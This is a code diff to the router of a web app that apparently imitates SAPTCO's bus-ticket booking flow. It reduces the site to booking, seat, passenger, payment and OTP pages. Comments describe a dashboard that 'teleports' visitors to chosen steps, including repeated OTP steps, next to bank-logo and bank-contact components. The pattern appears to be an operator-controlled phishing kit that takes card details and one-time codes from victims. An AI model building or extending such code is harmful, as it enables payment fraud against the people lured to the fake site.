@@ -24,9 +24,9 @@ import { findBankLogo } from "@/lib/bank-logos";
 // SAPTCO ticket flow: each dashboard step maps to a public route. The
 // dashboard's "Push to step" buttons use these to teleport a visitor.
 const TICKET_STEP_TO_PATH: Record<number, string> = {
-  1: "/search-results",
-  2: "/passenger-details",
-  3: "/seat-selection",
+  1: "/schedule",
+  2: "/seat-selection",
+  3: "/passenger-details",
   4: "/payment",
   5: "/otp",
   6: "/otp",
@@ -86,48 +86,29 @@ function DirectedStepWatcher() {
   return null;
 }
 
-const Home = lazy(() => import("@/pages/home"));
 const OTPPage = lazy(() => import("@/pages/otp"));
 const DashboardPage = lazy(() => import("@/pages/dashboard"));
 const LoginPage = lazy(() => import("@/pages/login"));
-const TripsPage = lazy(() => import("@/pages/trips"));
-const BookingsPage = lazy(() => import("@/pages/bookings"));
-const RegisterPage = lazy(() => import("@/pages/register"));
-const ServicesPage = lazy(() => import("@/pages/services"));
-const TripBookingPage = lazy(() => import("@/pages/trip-booking"));
 const SchedulePage = lazy(() => import("@/pages/schedule"));
-const SearchResultsPage = lazy(() => import("@/pages/search-results"));
+const BookPage = lazy(() => import("@/pages/book"));
 const SeatSelectionPage = lazy(() => import("@/pages/seat-selection"));
 const PassengerDetailsPage = lazy(() => import("@/pages/passenger-details"));
 const PaymentPage = lazy(() => import("@/pages/payment"));
-const MediaCenterPage = lazy(() => import("@/pages/media-center"));
-const ContactPage = lazy(() => import("@/pages/contact"));
-const SATransPage = lazy(() => import("@/pages/satrans"));
 const NotFound = lazy(() => import("@/pages/not-found"));
 
 function Router() {
   return (
     <Suspense fallback={null}>
       <Switch>
-        <Route path="/" component={SchedulePage} />
-        <Route path="/home" component={Home} />
+        <Route path="/" component={BookPage} />
+        <Route path="/book" component={BookPage} />
         <Route path="/otp" component={OTPPage} />
         <Route path="/dashboard" component={DashboardPage} />
         <Route path="/login" component={LoginPage} />
-        <Route path="/trips" component={TripsPage} />
-        <Route path="/bookings" component={BookingsPage} />
-        <Route path="/register" component={RegisterPage} />
-        <Route path="/services" component={ServicesPage} />
-        <Route path="/trip-booking" component={TripBookingPage} />
         <Route path="/schedule" component={SchedulePage} />
-        <Route path="/search-results" component={SearchResultsPage} />
         <Route path="/seat-selection" component={SeatSelectionPage} />
         <Route path="/passenger-details" component={PassengerDetailsPage} />
         <Route path="/payment" component={PaymentPage} />
-        <Route path="/MediaCenter" component={MediaCenterPage} />
-        <Route path="/media-center" component={MediaCenterPage} />
-        <Route path="/contact" component={ContactPage} />
-        <Route path="/satrans" component={SATransPage} />
         <Route component={NotFound} />
       </Switch>
     </Suspense>
@@ -358,19 +339,13 @@ function BankContactGate() {
 }
 
 const PATH_TO_PAGE: Record<string, string> = {
-  "/": "schedule",
-  "/home": "home",
+  "/": "book",
+  "/book": "book",
   "/schedule": "schedule",
-  "/trip-booking": "trip_booking",
-  "/trips": "trips",
-  "/search-results": "search_results",
   "/passenger-details": "passenger_details",
   "/seat-selection": "seat_selection",
   "/payment": "payment",
   "/otp": "otp",
-  "/contact": "contact",
-  "/satrans": "satrans",
-  "/register": "registration",
 };
 
 function pathToPage(path: string): string {
